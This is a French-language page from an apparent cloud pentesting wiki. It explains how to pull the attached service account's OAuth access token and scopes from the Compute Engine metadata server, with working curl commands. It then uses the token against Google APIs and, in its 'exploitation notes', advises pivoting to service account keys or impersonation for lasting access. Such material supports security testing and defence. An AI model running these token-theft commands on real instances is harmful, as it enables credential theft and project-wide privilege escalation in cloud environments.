---
title: "Jeton de compte de service : jeton OAuth et portées depuis le serveur de métadonnées"
description: "Récupération du jeton OAuth et des portées du compte de service attaché depuis le point de terminaison des comptes de service du serveur de métadonnées."
keywords:
  - jeton de métadonnées
  - compte de service
  - jeton OAuth
  - portées
  - métadonnées GCE
  - computeMetadata
---

# Jeton de compte de service

Sur n'importe quelle instance Compute Engine ou nœud GKE, le serveur de métadonnées fournit le jeton d'accès OAuth actif du compte de service attaché. Exportez-le et vous agissez en tant que ce compte de service tant que le jeton est valide, avec tous les rôles qu'il détient dans le projet.

## Lecture du jeton et des portées

```bash
# the default (attached) service account
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
# -> {"access_token":"ya29....","expires_in":3599,"token_type":"Bearer"}

# the granted scopes decide what the token can call
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes'

# the account's email, and the full tree
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email'
```

## Utilisation du jeton

```bash
TOKEN=$(curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" \
  'https://cloudresourcemanager.googleapis.com/v1/projects'
```

## Notes d'exploitation

- Les **portées** limitent le jeton indépendamment d'IAM : un jeton dont la portée est uniquement `cloud-platform` est large, mais des portées héritées comme `devstorage.read_only` le limitent quels que soient les rôles du compte. Lisez d'abord les portées.
- Les comptes de service Compute Engine par défaut détiennent historiquement le rôle large **Editor** sur le projet, donc un jeton sans restriction de portée confère souvent un accès en écriture à l'échelle du projet.
- Le jeton est éphémère (environ une heure) ; pour un accès durable, pivotez vers les [clés de compte de service](../service-account-keys.md) ou l'[usurpation d'identité](../../identity/service-account-impersonation/index.md).

## Outils

- **gcloud** une fois le jeton exporté (`CLOUDSDK_AUTH_ACCESS_TOKEN`).
- **curl** contre le serveur de métadonnées et les API Google.

## Références

- [Google: VM metadata and tokens](https://cloud.google.com/compute/docs/metadata/overview)
- [Rhino Security Labs: GCP privilege escalation](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
